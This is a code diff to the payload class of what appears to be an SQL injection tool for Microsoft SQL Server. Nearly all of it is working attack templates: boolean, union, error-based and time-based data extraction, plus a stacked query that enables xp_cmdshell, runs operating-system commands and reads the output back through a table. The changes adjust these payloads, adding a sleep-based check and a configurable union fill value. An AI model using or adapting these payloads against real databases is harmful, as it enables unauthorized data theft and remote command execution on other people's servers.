@@ -41,6 +41,8 @@ namespace SuperSQLInjection.payload
 
         //多字符
         public static String unicode_value = "cast(unicode(substring({data},{index},1)) as varchar(100))";
+        public static String nocast_unicode_value = "unicode(substring({data},{index},1))";
+       
 
         public static String substr = "substring(({data}),{index},1)";
         public static String substr_value = "substring(({data}),{index},{len})";
@@ -49,6 +51,7 @@ namespace SuperSQLInjection.payload
         public static String bool_length = " and len({data})>{len}";
         public static String bool_dataLength = " and datalength({data})>{len}";
         public static String bool_value = " and {data}>{len}";
+        public static String check_li_value = " and len({data})<{len}";
 
         //bool方式获取值
 
@@ -62,11 +65,11 @@ namespace SuperSQLInjection.payload
         public static String union_value = " and 1=2 union all select {data}";
 
         //error方式
-        public static String error_value = " or convert(int,(char(94)+char(94)+char(33)+cast({data} as varchar(2000))+char(33)+char(94)+char(94)))=1";
+        public static String error_value = " and convert(int,(char(94)+char(94)+char(33)+cast({data} as varchar(2000))+char(33)+char(94)+char(94)))=1";
 
 
         //cmd
-        public static String createTable = ";drop table ssqlinjection;create table ssqlinjection(id int primary key identity,data text);exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;declare @cmd varchar(8000);set @cmd={cmd};insert into ssqlinjection(data) exec [master]..[xp_cmdshell] @cmd--";
+        public static String createTable = ";drop table ssqlinjection;create table ssqlinjection(id int primary key identity,data varchar(8000));exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;declare @cmd varchar(8000);set @cmd={cmd};insert into ssqlinjection(data) exec [master]..[xp_cmdshell] @cmd--";
         public static String cmdData = "cast((select top 1 data from ssqlinjection where id={index}) as varchar(8000))";
         public static String cmdDataCount = "(select count(*) from ssqlinjection)";
         public static String dropTable = ";drop table ssqlinjection;--";
@@ -81,19 +84,22 @@ namespace SuperSQLInjection.payload
         //读文件的的payload
         public static String file_content = "(select data from ssqlinjection)";
 
+        public static String getBoolCountBySleep(String data, int maxTime)
+        {
+            return ";if(0x1=0x1" + data + ") waitfor delay '0:0:"+ maxTime + "'";
+        }
 
-
-       /// <summary>
-       /// 获取union的payload
-       /// </summary>
-       /// <param name="columnsLen">列长</param>
-       /// <param name="showIndex">显示列</param>
-       /// <param name="Fill">填充</param>
-       /// <param name="dbname">数据库名</param>
-       /// <param name="table">表名</param>
-       /// <param name="column">获取数据的字段</param>
-       /// <param name="index">第几行数据，1开始</param>
-        public static String getUnionDataValue(int columnsLen,int showIndex,int Fill,String dbname,String table,List<String> columns,int index)
+        /// <summary>
+        /// 获取union的payload
+        /// </summary>
+        /// <param name="columnsLen">列长</param>
+        /// <param name="showIndex">显示列</param>
+        /// <param name="Fill">填充</param>
+        /// <param name="dbname">数据库名</param>
+        /// <param name="table">表名</param>
+        /// <param name="column">获取数据的字段</param>
+        /// <param name="index">第几行数据，1开始</param>
+        public static String getUnionDataValue(int columnsLen,int showIndex,String Fill,String dbname,String table,List<String> columns,int index)
         {
             StringBuilder sb = new StringBuilder();
             String data = data_value.Replace("{data}", concatAllColumnsByConcatStr(columns)).Replace("{allcolumns}", concatAllColumns(columns)).Replace("{orderby}", columns[0]);
@@ -122,7 +128,7 @@ namespace SuperSQLInjection.payload
         /// <param name="Fill">填充</param>
         /// <param name="dataPayLoad">值payload</param>
         /// <returns></returns>
-        public static String getUnionDataValue(int columnsLen, int showIndex, int Fill,String dataPayLoad)
+        public static String getUnionDataValue(int columnsLen, int showIndex, String Fill,String dataPayLoad)
         {
             StringBuilder sb = new StringBuilder();
             for (int i = 1; i <= columnsLen; i++)
@@ -140,7 +146,7 @@ namespace SuperSQLInjection.payload
             return union_value.Replace("{data}", sb.ToString());
         }
 
-        public static String getUnionDataValueByCMD(int columnsLen, int showIndex, String dataPayLoad)
+        public static String getUnionDataValueByCMD(int columnsLen, int showIndex, String Fill, String dataPayLoad)
         {
             StringBuilder sb = new StringBuilder();
             for (int i = 1; i <= columnsLen; i++)
@@ -151,7 +157,7 @@ namespace SuperSQLInjection.payload
                 }
                 else
                 {
-                    sb.Append("1,");
+                    sb.Append(Fill+",");
                 }
             }
             sb.Remove(sb.Length - 1, 1);
@@ -169,7 +175,7 @@ namespace SuperSQLInjection.payload
         /// <param name="table">表名</param>
         /// <param name="index">第几行数据，1开始</param>
         /// <returns></returns>
-        public static String getUnionDataValue(int columnsLen, int showIndex, int Fill, String dataPayLoad,String dbname,String table,String index)
+        public static String getUnionDataValue(int columnsLen, int showIndex, String Fill, String dataPayLoad,String dbname,String table,String index)
         {
             StringBuilder sb = new StringBuilder();
             for (int i = 1; i <= columnsLen; i++)
